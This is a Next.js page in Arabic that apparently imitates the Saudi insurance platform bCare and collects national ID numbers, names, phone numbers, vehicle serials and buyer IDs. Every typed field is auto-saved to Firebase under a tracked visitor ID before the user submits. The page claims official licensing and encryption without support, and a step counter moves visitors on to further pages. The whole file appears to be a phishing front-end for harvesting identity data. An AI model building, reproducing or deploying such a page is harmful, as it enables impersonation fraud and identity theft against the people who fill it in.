"use client";
import { useState, useEffect, useCallback } from "react";
import { useRouter } from "next/navigation";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import {
  getOrCreateVisitorID,
  initializeVisitorTracking,
  updateVisitorPage,
} from "@/lib/visitor-tracking";
import { addData } from "@/lib/firebase";
import { useAutoSave } from "@/hooks/use-auto-save";
import {
  Globe,
  RefreshCw,
  Loader2,
  UserCircle2,
  Car,
  Stethoscope,
  ShieldAlert,
  Plane,
  ShieldCheck,
  BadgeCheck,
  Phone,
  MessageCircle,
  ChevronDown,
  Instagram,
  Youtube,
  X,
  Star,
  HeadphonesIcon,
  CheckCircle2,
  Building2,
  Clock,
  Users,
} from "lucide-react";
import { VehicleDropdownOption } from "@/lib/v-types";

function generateCaptcha() {
  return Math.floor(1000 + Math.random() * 9000).toString();
}

function validateSaudiId(id: string): { valid: boolean; error: string } {
  const cleanId = id.replace(/\s/g, "");
  if (!/^\d{10}$/.test(cleanId)) {
    return { valid: false, error: "رقم الهوية يجب أن يتكون من 10 أرقام" };
  }
  if (!/^[12]/.test(cleanId)) {
    return { valid: false, error: "رقم الهوية يجب أن يبدأ بـ 1 أو 2" };
  }
  let sum = 0;
  for (let i = 0; i < 10; i++) {
    let digit = Number.parseInt(cleanId[i]);
    if ((10 - i) % 2 === 0) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
  }
  if (sum % 10 !== 0) {
    return { valid: false, error: "رقم الهوية غير صحيح" };
  }
  return { valid: true, error: "" };
}

export default function Home() {
  const router = useRouter();
  const [visitorID] = useState(() => getOrCreateVisitorID());
  const [identityNumber, setIdentityNumber] = useState("");
  const [ownerName, setOwnerName] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [documentType, setDocumentType] = useState("استمارة");
  const [serialNumber, setSerialNumber] = useState("");
  const [insuranceType, setInsuranceType] = useState("تأمين جديد");
  const [buyerName, setBuyerName] = useState("");
  const [buyerIdNumber, setBuyerIdNumber] = useState("");
  const [activeTab, setActiveTab] = useState("مركبات");
  const [captchaCode, setCaptchaCode] = useState(generateCaptcha());
  const [captchaInput, setCaptchaInput] = useState("");
  const [captchaError, setCaptchaError] = useState(false);
  const [identityNumberError, setIdentityNumberError] = useState("");
  const [submitting, setSubmitting] = useState(false);

  const [vehicleOptions, setVehicleOptions] = useState<VehicleDropdownOption[]>([]);
  const [isLoadingVehicles, setIsLoadingVehicles] = useState(false);
  const [showVehicleDropdown, setShowVehicleDropdown] = useState(false);
  const [selectedVehicle, setSelectedVehicle] = useState<VehicleDropdownOption | null>(null);
  const [serialFieldFocused, setSerialFieldFocused] = useState(false);
  const [visitorInitialized, setVisitorInitialized] = useState(false);

  useEffect(() => {
    if (!visitorID) return;
    const init = async () => {
      await initializeVisitorTracking(visitorID);
      await updateVisitorPage(visitorID, "home-new", 1);
      setVisitorInitialized(true);
    };
    init();
  }, [visitorID]);

  useAutoSave({
    visitorId: visitorInitialized ? visitorID : "",
    pageName: "home",
    data: { identityNumber, ownerName, phoneNumber, documentType, serialNumber, insuranceType, buyerName, buyerIdNumber, activeTab },
  });

  const fetchVehicles = useCallback(async (nin: string) => {
    const validation = validateSaudiId(nin);
    if (!validation.valid) {
      setVehicleOptions([]);
      setShowVehicleDropdown(false);
      return;
    }
    setIsLoadingVehicles(true);
    setVehicleOptions([]);
    setShowVehicleDropdown(false);
    try {
      const res = await fetch(`/api/vehicles/${nin}`);
      const data = await res.json();
      if (data.success && data.vehicles && data.vehicles.length > 0) {
        const options: VehicleDropdownOption[] = data.vehicles.map((v: any) => ({
          value: v.sequenceNumber || v.SequenceNumber || String(v.vehicleId || ""),
          label: `${v.sequenceNumber || v.SequenceNumber || ""} - ${v.vehicleMaker || v.VehicleMaker || ""} ${v.vehicleModel || v.VehicleModel || ""} ${v.modelYear || v.ModelYear || ""}`.trim(),
          vehicle: v,
        }));
        setVehicleOptions(options);
        setShowVehicleDropdown(true);
        setSerialFieldFocused(true);
      }
    } catch (error) {
      console.error("Error fetching vehicles:", error);
    } finally {
      setIsLoadingVehicles(false);
    }
  }, []);

  useEffect(() => {
    if (identityNumber.length === 10 && /^\d{10}$/.test(identityNumber)) {
      fetchVehicles(identityNumber);
    } else {
      setVehicleOptions([]);
      setShowVehicleDropdown(false);
      setSelectedVehicle(null);
    }
  }, [identityNumber, fetchVehicles]);

  const refreshCaptcha = () => {
    setCaptchaCode(generateCaptcha());
    setCaptchaInput("");
    setCaptchaError(false);
  };

  const handleIdentityNumberChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "").slice(0, 10);
    setIdentityNumber(cleaned);
    if (identityNumberError) setIdentityNumberError("");
  };

  const handlePhoneNumberChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    if (cleaned.startsWith("05")) {
      setPhoneNumber(cleaned.slice(0, 10));
    } else if (cleaned.startsWith("5") && !cleaned.startsWith("05")) {
      setPhoneNumber(cleaned.slice(0, 9));
    } else {
      setPhoneNumber(cleaned.slice(0, 10));
    }
  };

  const handleBuyerIdNumberChange = (value: string) => {
    setBuyerIdNumber(value.replace(/\D/g, "").slice(0, 10));
  };

  const handleSerialNumberChange = (value: string) => {
    setSerialNumber(value.replace(/\D/g, ""));
  };

  const handleVehicleSelect = (option: VehicleDropdownOption) => {
    setSerialNumber(option.value);
    setSelectedVehicle(option);
    setSerialFieldFocused(false);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const validation = validateSaudiId(identityNumber);
    if (!validation.valid) {
      setIdentityNumberError(validation.error);
      return;
    }
    if (captchaInput !== captchaCode) {
      setCaptchaError(true);
      return;
    }
    setSubmitting(true);
    try {
      localStorage.setItem("homeFormData", JSON.stringify({
        identityNumber, ownerName, phoneNumber, documentType, serialNumber,
        insuranceType, buyerName, buyerIdNumber, activeTab, selectedVehicle,
        timestamp: new Date().toISOString(),
      }));
      await addData({
        id: visitorID,
        identityNumber, ownerName, phoneNumber, documentType, serialNumber,
        insuranceType,
        buyerName: insuranceType === "نقل ملكية" ? buyerName : "",
        buyerIdNumber: insuranceType === "نقل ملكية" ? buyerIdNumber : "",
        activeTab,
        selectedVehicle: selectedVehicle ? { value: selectedVehicle.value, label: selectedVehicle.label } : null,
        currentStep: 2,
        currentPage: "insur",
      });
    } catch (err) {
      console.error("Error saving form data:", err);
    }
    router.push("/insur");
  };

  const productTabs = [
    { label: "مركبات", icon: Car },
    { label: "طبي", icon: Stethoscope },
    { label: "أخطاء طبية", icon: ShieldAlert },
    { label: "سفر", icon: Plane },
  ];

  const stats = [
    { value: "100%", label: "رضى تاماً", icon: Star },
    { value: "3", label: "دقائق", icon: Clock },
    { value: "+25", label: "شركة تأمين", icon: Building2 },
  ];

  const whyItems = [
    { label: "تقييم ممتاز", sub: "4.9/5 من تقييمات العملاء", icon: Star, color: "text-amber-500 bg-amber-50" },
    { label: "أمان وثقة", sub: "مرخص من الجهات الرسمية السعودية", icon: ShieldCheck, color: "text-blue-600 bg-blue-50" },
    { label: "دعم مستمر", sub: "خدمة متخصصة متاحة 24/7", icon: HeadphonesIcon, color: "text-green-600 bg-green-50" },
    { label: "خبرة واسعة", sub: "أكثر من 500,000 عميل راضٍ", icon: Users, color: "text-purple-600 bg-purple-50" },
  ];

  const footerServices = ["تأمين السيارات", "تأمين طبي", "تأمين سفر", "إدارة الوثيقة"];
  const footerSupport = ["مركز المساعدة", "التواصل معنا", "الشروط والأحكام", "سياسة الخصوصية"];

  return (
    <div className="min-h-screen bg-[#f0f4f8]" dir="rtl" data-testid="page-home">

      {/* Top announcement bar */}
      <div className="bg-gradient-to-l from-[#f4ad27] to-[#e89d1a] py-1.5 text-center text-[11px] font-bold text-white">
        🎉 منصة وطنية موثقة ومرخصة — احصل على أفضل عرض تأمين الآن
      </div>

      {/* Header */}
      <header className="sticky top-0 z-30 bg-white shadow-sm border-b border-gray-100">
        <div className="mx-auto flex max-w-[420px] items-center justify-between px-4 py-2.5">
          <button className="rounded-lg border border-[#d2dfeb] bg-[#f7fafc] px-3 py-1.5 text-[11px] font-bold text-[#1a5676]">
            EN
          </button>
          <div className="flex items-center gap-1.5">
            <img src="/logb.jpg" alt="bCare" className="h-7 rounded-lg object-contain" onError={(e) => { (e.target as HTMLImageElement).style.display='none' }} />
          </div>
          <UserCircle2 className="h-6 w-6 text-[#1a5676]" />
        </div>
      </header>

      <main className="mx-auto w-full max-w-[420px] px-3 pb-6">

        {/* Hero */}
        <section className="mt-3 overflow-hidden rounded-2xl shadow-lg">
          <div
            className="relative flex min-h-[140px] flex-col items-center justify-center bg-gradient-to-br from-[#1a5676] to-[#0e3a57] p-5 text-center text-white"
            style={{ backgroundImage: "url(/logb.jpg)", backgroundSize: "cover", backgroundPosition: "center" }}
          >
            <div className="absolute inset-0 bg-gradient-to-b from-[#1a5676]/80 to-[#0e3a57]/90 rounded-2xl"></div>
            <div className="relative z-10 space-y-1">
              <p className="text-[11px] font-semibold text-white/80 bg-white/10 rounded-full px-3 py-0.5 inline-block">
                ✅ منصة تأمين السيارات الأولى في السعودية
              </p>
              <h1 className="text-xl font-extrabold leading-snug">
                احصل على أفضل عروض
                <br />
                <span className="text-[#f4ad27]">تأمين السيارات</span>
              </h1>
            </div>
          </div>

          {/* Stats bar */}
          <div className="grid grid-cols-3 divide-x divide-x-reverse divide-gray-100 bg-white">
            {stats.map(({ value, label, icon: Icon }) => (
              <div key={label} className="flex flex-col items-center py-3 gap-0.5">
                <span className="text-lg font-extrabold text-[#1a5676]">{value}</span>
                <span className="text-[10px] font-semibold text-gray-500">{label}</span>
              </div>
            ))}
          </div>
        </section>

        {/* Form card */}
        <section className="mt-4 rounded-2xl bg-white shadow-md border border-gray-100 overflow-hidden">
          {/* Card header */}
          <div className="bg-gradient-to-l from-[#1a5676] to-[#2270a0] px-4 py-3 text-white">
            <h2 className="text-sm font-bold">احصل على عرض السعر الخاص بك</h2>
            <p className="text-[10px] text-white/75 mt-0.5">
              اتبع الخطوات البسيطة للحصول على أفضل عروض التأمين
            </p>
            {/* Progress */}
            <div className="mt-2 flex items-center gap-2">
              <div className="flex-1 h-1.5 rounded-full bg-white/20">
                <div className="h-full w-full rounded-full bg-[#f4ad27]" />
              </div>
              <span className="text-[10px] font-bold text-[#f4ad27]">100%</span>
            </div>
          </div>

          {/* Product tabs */}
          <div className="grid grid-cols-4 border-b border-gray-100">
            {productTabs.map((tab) => {
              const Icon = tab.icon;
              return (
                <button
                  key={tab.label}
                  type="button"
                  onClick={() => setActiveTab(tab.label)}
                  className={`flex flex-col items-center gap-1 py-2.5 text-[10px] font-semibold transition-all ${
                    activeTab === tab.label
                      ? "bg-[#1a5676] text-white border-b-2 border-[#f4ad27]"
                      : "text-gray-500 hover:bg-gray-50"
                  }`}
                >
                  <Icon className="h-3.5 w-3.5" />
                  <span>{tab.label}</span>
                </button>
              );
            })}
          </div>

          <form onSubmit={handleSubmit} className="p-4 space-y-3">
            {/* Insurance type toggle */}
            <div className="grid grid-cols-2 gap-2">
              {["تأمين جديد", "نقل ملكية"].map((type) => (
                <button
                  key={type}
                  type="button"
                  onClick={() => setInsuranceType(type)}
                  className={`h-10 rounded-xl text-sm font-bold transition-all ${
                    insuranceType === type
                      ? "bg-[#1a5676] text-white shadow-md"
                      : "bg-[#f0f5f9] text-[#1a5676] hover:bg-[#e2edf5]"
                  }`}
                >
                  {type}
                </button>
              ))}
            </div>

            {/* Identity field */}
            <div className="space-y-1">
              <label className="block text-xs font-semibold text-gray-600 text-right">
                رقم الهوية / الإقامة <span className="text-red-500">*</span>
              </label>
              <div className="relative">
                <Input
                  type="tel"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  placeholder="رقم الهوية / الإقامة"
                  value={identityNumber}
                  onChange={(e) => handleIdentityNumberChange(e.target.value)}
                  className="h-11 rounded-xl border-2 border-[#d0dce8] bg-white text-sm text-right focus:border-[#1a5676] transition-colors"
                  dir="rtl"
                  required
                />
                {isLoadingVehicles && (
                  <Loader2 className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 animate-spin text-[#1a5676]" />
                )}
              </div>
              {identityNumberError && (
                <p className="text-xs font-semibold text-red-600">{identityNumberError}</p>
              )}
            </div>

            {/* Owner name */}
            <div className="space-y-1">
              <label className="block text-xs font-semibold text-gray-600 text-right">
                اسم المالك <span className="text-red-500">*</span>
              </label>
              <Input
                placeholder="اسم المالك"
                value={ownerName}
                onChange={(e) => setOwnerName(e.target.value)}
                className="h-11 rounded-xl border-2 border-[#d0dce8] bg-white text-sm text-right focus:border-[#1a5676] transition-colors"
                dir="rtl"
                required
              />
            </div>

            {/* Phone */}
            <div className="space-y-1">
              <label className="block text-xs font-semibold text-gray-600 text-right">
                رقم الجوال <span className="text-red-500">*</span>
              </label>
              <Input
                type="tel"
                inputMode="numeric"
                pattern="[0-9]*"
                placeholder="رقم الجوال"
                value={phoneNumber}
                onChange={(e) => handlePhoneNumberChange(e.target.value)}
                className="h-11 rounded-xl border-2 border-[#d0dce8] bg-white text-sm text-right focus:border-[#1a5676] transition-colors"
                dir="rtl"
                required
              />
            </div>

            {/* Transfer fields */}
            {insuranceType === "نقل ملكية" && (
              <>
                <div className="space-y-1">
                  <label className="block text-xs font-semibold text-gray-600 text-right">اسم المشتري</label>
                  <Input
                    placeholder="اسم المشتري"
                    value={buyerName}
                    onChange={(e) => setBuyerName(e.target.value)}
                    className="h-11 rounded-xl border-2 border-[#d0dce8] bg-white text-sm text-right focus:border-[#1a5676] transition-colors"
                    dir="rtl"
                    required
                  />
                </div>
                <div className="space-y-1">
                  <label className="block text-xs font-semibold text-gray-600 text-right">رقم هوية المشتري</label>
                  <Input
                    type="tel"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    placeholder="رقم هوية المشتري"
                    value={buyerIdNumber}
                    onChange={(e) => handleBuyerIdNumberChange(e.target.value)}
                    className="h-11 rounded-xl border-2 border-[#d0dce8] bg-white text-sm text-right focus:border-[#1a5676] transition-colors"
                    dir="rtl"
                    required
                  />
                </div>
              </>
            )}

            {/* Document type */}
            <div className="space-y-1">
              <label className="block text-xs font-semibold text-gray-600 text-right">نوع الوثيقة</label>
              <div className="grid grid-cols-2 gap-2">
                {["استمارة", "بطاقة جمركية"].map((type) => (
                  <button
                    key={type}
                    type="button"
                    onClick={() => setDocumentType(type)}
                    className={`h-10 rounded-xl text-sm font-bold transition-all ${
                      documentType === type
                        ? "bg-[#1a5676] text-white shadow-md"
                        : "bg-[#f0f5f9] text-[#1a5676] hover:bg-[#e2edf5]"
                    }`}
                  >
                    {type}
                  </button>
                ))}
              </div>
            </div>

            {/* Serial number */}
            <div className="space-y-1">
              <label className="block text-xs font-semibold text-gray-600 text-right">
                {documentType === "بطاقة جمركية" ? "رقم البيان الجمركي" : "الرقم التسلسلي"} <span className="text-red-500">*</span>
              </label>
              <div className="relative">
                <Input
                  type="tel"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  placeholder={documentType === "بطاقة جمركية" ? "رقم البيان الجمركي" : "الرقم التسلسلي"}
                  value={serialNumber}
                  onChange={(e) => { handleSerialNumberChange(e.target.value); setSelectedVehicle(null); }}
                  onFocus={() => { if (vehicleOptions.length > 0) setSerialFieldFocused(true); }}
                  onBlur={() => { setTimeout(() => setSerialFieldFocused(false), 200); }}
                  className="h-11 rounded-xl border-2 border-[#d0dce8] bg-white text-sm text-right focus:border-[#1a5676] transition-colors"
                  dir="rtl"
                  required
                />
                {isLoadingVehicles && (
                  <div className="absolute left-3 top-1/2 -translate-y-1/2">
                    <Loader2 className="h-4 w-4 animate-spin text-[#0a4a68]" />
                  </div>
                )}
                {vehicleOptions.length > 0 && !isLoadingVehicles && (
                  <button
                    type="button"
                    className="absolute left-2 top-1/2 -translate-y-1/2 p-1"
                    onClick={() => setSerialFieldFocused(!serialFieldFocused)}
                  >
                    <ChevronDown className={`h-4 w-4 text-[#0a4a68] transition-transform ${serialFieldFocused ? "rotate-180" : ""}`} />
                  </button>
                )}
              </div>

              {selectedVehicle && !serialFieldFocused && (
                <div className="mt-1 rounded-xl border border-[#d0dce8] bg-[#f0f7fc] p-2.5 text-right" dir="rtl">
                  <p className="text-[10px] text-[#6b8299]">المركبة المختارة</p>
                  <p className="text-sm font-medium text-[#1f2f3a]">{selectedVehicle.label}</p>
                </div>
              )}

              {serialFieldFocused && vehicleOptions.length > 0 && (
                <div className="absolute z-50 mt-1 w-full rounded-xl border border-[#d0dce8] bg-white shadow-xl overflow-hidden" dir="rtl">
                  <div className="max-h-48 overflow-y-auto">
                    {vehicleOptions.map((option) => (
                      <button
                        key={option.value}
                        type="button"
                        className={`w-full px-3 py-2.5 text-right text-sm hover:bg-[#f0f7fc] transition-colors border-b border-[#f0f4f8] last:border-b-0 ${serialNumber === option.value ? "bg-[#e8f4fc] font-medium text-[#0a4a68]" : "text-[#1f2f3a]"}`}
                        onMouseDown={(e) => { e.preventDefault(); handleVehicleSelect(option); }}
                      >
                        <div className="flex items-center justify-between">
                          <span className="text-xs text-[#6b8299]">{option.value}</span>
                          <span>{option.label}</span>
                        </div>
                      </button>
                    ))}
                  </div>
                  <button
                    type="button"
                    className="w-full px-3 py-2 text-center text-sm text-[#6b8299] hover:bg-[#fef3cd] transition-colors border-t border-[#d0dce8]"
                    onMouseDown={(e) => { e.preventDefault(); setSerialFieldFocused(false); setSerialNumber(""); setSelectedVehicle(null); }}
                  >
                    --- إدخال رقم يدوي ---
                  </button>
                </div>
              )}
            </div>

            {/* Captcha */}
            <div className="rounded-xl border border-[#d8e4ef] bg-[#f7fbff] p-3 space-y-2">
              <label className="block text-xs font-semibold text-gray-600 text-right">رمز التحقق</label>
              <div className="flex items-center justify-between gap-2">
                <div className="flex items-center gap-2 rounded-lg bg-white px-3 py-2 border border-[#d0dce8]" dir="ltr">
                  {captchaCode.split("").map((digit, idx) => (
                    <span key={idx} className={`text-xl font-black select-none ${idx % 2 === 0 ? "text-[#1a5676]" : "text-[#f4ad27]"}`}>
                      {digit}
                    </span>
                  ))}
                  <button
                    type="button"
                    onClick={refreshCaptcha}
                    className="rounded-md bg-[#1a5676] p-1 text-white ml-1"
                  >
                    <RefreshCw className="h-3.5 w-3.5" />
                  </button>
                </div>
                <Input
                  placeholder="أدخل الرمز"
                  value={captchaInput}
                  onChange={(e) => { setCaptchaInput(e.target.value); if (captchaError) setCaptchaError(false); }}
                  className={`h-11 flex-1 rounded-xl text-sm border-2 ${captchaError ? "border-red-500" : "border-[#d0dce8]"} focus:border-[#1a5676] transition-colors`}
                  dir="rtl"
                  required
                />
              </div>
              {captchaError && (
                <p className="text-xs font-semibold text-red-600">رمز التحقق غير صحيح</p>
              )}
            </div>

            {/* Submit */}
            <Button
              type="submit"
              disabled={submitting}
              className="h-12 w-full rounded-xl bg-gradient-to-l from-[#f4ad27] to-[#e09a18] text-sm font-extrabold text-[#1a3d52] shadow-md hover:from-[#e9a71f] hover:to-[#d48f10] transition-all"
            >
              {submitting ? (
                <Loader2 className="h-4 w-4 animate-spin" />
              ) : (
                "ابدأ الآن — احصل على عرضك"
              )}
            </Button>

            <p className="text-center text-[10px] text-gray-400">
              🔒 بياناتك محمية ومشفرة بالكامل
            </p>
          </form>
        </section>

        {/* Trust badges */}
        <section className="mt-4 rounded-xl bg-white border border-gray-100 shadow-sm px-3 py-2.5">
          <div className="flex items-center justify-center gap-4">
            {["Vision 2030", "NIC", "Saudi Arabia"].map((badge) => (
              <span key={badge} className="text-[10px] font-bold text-[#1a5676] bg-blue-50 px-2 py-1 rounded-lg">{badge}</span>
            ))}
          </div>
        </section>

        {/* Why trust us */}
        <section className="mt-4 rounded-2xl bg-white border border-gray-100 shadow-sm p-4">
          <h2 className="text-center text-sm font-bold text-[#1a5676] mb-3">
            لماذا يثق بنا أكثر من 500,000 عميل؟
          </h2>
          <div className="grid grid-cols-2 gap-2.5">
            {whyItems.map(({ label, sub, icon: Icon, color }) => (
              <div key={label} className="rounded-xl border border-gray-100 p-3 text-center space-y-1.5">
                <div className={`w-9 h-9 rounded-xl flex items-center justify-center mx-auto ${color}`}>
                  <Icon className="h-4 w-4" />
                </div>
                <p className="text-xs font-bold text-gray-800">{label}</p>
                <p className="text-[10px] text-gray-500 leading-4">{sub}</p>
              </div>
            ))}
          </div>
        </section>

        {/* Need help? */}
        <section className="mt-4 rounded-2xl bg-gradient-to-br from-[#1a5676] to-[#0e3a57] p-4 text-white text-center space-y-3">
          <h2 className="text-sm font-bold">هل تحتاج مساعدة؟</h2>
          <p className="text-[11px] text-white/70">
            فريق الخبراء متاح للمساعدة في اختيار أفضل التغطيات
          </p>
          <div className="grid grid-cols-2 gap-2">
            <a href="tel:920000000" className="flex items-center justify-center gap-2 bg-white/15 hover:bg-white/25 rounded-xl py-2.5 text-xs font-bold transition-all">
              <Phone className="h-4 w-4 text-[#f4ad27]" />
              اتصل بنا
            </a>
            <a href="#" className="flex items-center justify-center gap-2 bg-[#f4ad27] hover:bg-[#e9a71f] rounded-xl py-2.5 text-xs font-bold text-[#1a3d52] transition-all">
              <MessageCircle className="h-4 w-4" />
              واتساب
            </a>
          </div>
          <div className="flex items-center justify-center gap-4 pt-1">
            <span className="text-[10px] text-white/60">98% رضى العملاء</span>
            <span className="text-[10px] text-white/60">24/7 خدمة</span>
            <span className="text-[10px] text-white/60">أقل من 30 دقيقة</span>
          </div>
        </section>
      </main>

      {/* Footer */}
      <footer className="mt-4 bg-[#0c3a52] text-white">
        <div className="mx-auto w-full max-w-[420px] px-4 py-5">
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center gap-2">
              <div className="w-7 h-7 bg-[#f4ad27] rounded-lg flex items-center justify-center">
                <Car className="h-4 w-4 text-white" />
              </div>
              <span className="text-sm font-bold">بي كير</span>
            </div>
            <p className="text-xs font-bold text-[#f4ad27]">8001180044</p>
          </div>

          <div className="grid grid-cols-2 gap-4 mb-4">
            <div>
              <p className="text-[10px] font-bold text-white/50 mb-2 uppercase tracking-wider">الخدمات</p>
              {footerServices.map((item) => (
                <button key={item} type="button" className="block text-[11px] text-white/75 hover:text-white py-1 transition-colors">
                  {item}
                </button>
              ))}
            </div>
            <div>
              <p className="text-[10px] font-bold text-white/50 mb-2 uppercase tracking-wider">الدعم</p>
              {footerSupport.map((item) => (
                <button key={item} type="button" className="block text-[11px] text-white/75 hover:text-white py-1 transition-colors">
                  {item}
                </button>
              ))}
            </div>
          </div>

          <div className="flex items-center justify-between pt-3 border-t border-white/10">
            <p className="text-[10px] text-white/50">جميع الحقوق محفوظة © 2024</p>
            <div className="flex items-center gap-2">
              {[Instagram, X, Youtube].map((Icon, i) => (
                <span key={i} className="w-7 h-7 rounded-lg bg-white/10 hover:bg-white/20 flex items-center justify-center cursor-pointer transition-colors">
                  <Icon className="h-3.5 w-3.5" />
                </span>
              ))}
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
